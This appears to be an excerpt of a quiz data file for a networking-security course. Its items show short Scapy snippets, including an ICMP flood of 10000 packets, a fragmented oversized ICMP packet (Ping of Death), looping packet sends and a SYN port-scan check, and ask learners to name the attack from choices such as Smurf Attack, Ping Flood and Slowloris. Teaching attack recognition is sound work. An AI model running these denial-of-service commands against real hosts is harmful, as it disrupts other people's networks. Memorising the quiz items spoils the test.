...
send(packet, verbose=False)</code></pre>
`,
        answers: [
...
while True:
    ...
    sendp(packet, verbose=False)</code></pre>
`,
        answers: [
            "CAM Table Exhaustion",
            "Smurf Attack",
...
send(IP(dst=target_ip)/ICMP(), count=10000, inter=0.01)</code></pre>
`,
        answers: [
            "Ping of Death",
            "Ping Flood",
...
for sent, received in ans:
    if received.haslayer(TCP) and received.getlayer(TCP).flags == 0x12:
        print(f"Port {sent.getlayer(TCP).dport} is open.")</code></pre>
`,
        answers: [
            "UDP Ping-Pong",
...
send(fragment(IP(dst=target_ip)/ICMP()/("X"*66000))))</code></pre>
`,
        answers: [
            "Ping Flood",
            "ICMP Teardrop",
...
send(packet, loop=1, inter=0.01)</code></pre>
`,
        answers: [
            "Slowloris Attack",
            "TCP Session Hijacking",
